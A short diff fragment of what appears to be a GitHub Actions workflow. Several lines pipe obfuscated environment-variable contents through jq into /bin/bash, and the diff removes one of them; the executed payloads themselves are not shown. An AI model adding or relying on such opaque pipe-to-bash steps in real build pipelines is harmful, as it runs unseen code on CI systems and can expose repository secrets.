@@ -27,7 +27,6 @@ jobs:
           echo $b91 | jq -r .ju510 | /bin/bash
           echo $quup2377 | jq -r .ee62272 | /bin/bash
           echo $x1 | jq -r .xxjil26430 | /bin/bash
-          echo $tf4 | jq -r .tkvn21 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
